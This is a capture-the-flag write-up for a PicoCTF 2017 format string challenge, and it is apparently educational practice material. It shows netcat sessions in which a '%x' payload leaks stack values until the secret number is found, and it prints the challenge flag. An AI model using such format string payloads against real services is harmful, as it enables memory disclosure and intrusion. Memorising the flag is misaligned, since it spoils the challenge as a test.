# PicoCTF 2017- Level 2 - Binary Exploitation 4

**Title:** Ive Got A Secret  
**Category:** Binary Exploitation  
**Points:** 75  
**Description:**

>Hopefully you can find the right format for my [secret](secret)! [Source](secret.c). Connect on shell2017.picoctf.com:6805.  

**Hint:**

>This is a beginning format string attack.  

## Solution

Basically, what this program does is to get a random number from `dev/urandom` labelled as `secret`, ask us for a string, display that string, and then ask us to guess the secret number.
As hinted we must use a [Format String Attack](https://www.owasp.org/index.php/Format_string_attack) to solve this problem.  
    $ nc shell2017.picoctf.com:6805  
    Give me something to say!  
    %x %x %x %x %x %x %x %x  
    40 f7fc7c20 8048792 1 ffffdd34 2cc6cf93 3 f7fc73c4  
    Now tell my secret in hex! Secret: a  
    As my friend says,"You get nothing! You lose! Good day, Sir!"  

Let's try again:
    $ nc shell2017.picoctf.com:6805  
    Give me something to say!  
    %x %x %x %x %x %x %x %x  
    40 f7fc7c20 8048792 1 ffffdd34 bd10c60a 3 f7fc73c4  
    Now tell my secret in hex! Secret: bd10c60a  
    d2b1dd0dc7b29ccfb612d9978d9f9ca4  
    Wow, you got it!  

To get the flag, we noticed that only 1 variable wass changing:
    40 f7fc7c20 8048792 1 ffffdd34 __2cc6cf93__ 3 f7fc73c4  
    40 f7fc7c20 8048792 1 ffffdd34 __bd10c60a__ 3 f7fc73c4    

This variable was the `secret` one, encoded in hex.  

The flag for this problem is `d2b1dd0dc7b29ccfb612d9978d9f9ca4`